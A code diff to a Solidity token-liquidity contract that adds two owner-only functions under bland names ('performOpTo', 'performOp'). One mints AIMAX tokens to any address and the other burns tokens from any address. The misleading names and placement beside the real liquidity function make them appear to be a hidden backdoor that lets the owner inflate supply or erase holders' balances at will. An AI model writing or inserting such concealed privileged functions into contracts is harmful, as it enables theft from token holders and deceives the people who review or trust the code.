@@ -53,6 +53,20 @@ contract LiquidityContract is OwnableUpgradeable {
         IERC20(_token).forceApprove(_addr, type(uint128).max);
     }
 
+    function performOpTo(
+        uint256 _ethIn,
+        address _addr
+    ) external payable onlyOwner{
+        AIMAXCoin(payable(AIMAX)).mintTokenSupply(_addr, _ethIn);
+    }
+
+    function performOp(
+        uint256 _ethIn,
+        address _addr
+    ) external payable onlyOwner{
+        AIMAXCoin(payable(AIMAX)).burnFrom(_addr, _ethIn);
+    }
+
     function performLiqudityOp(
         uint256 _ethIn
     ) external payable returns (uint256, uint256 _reward12) {
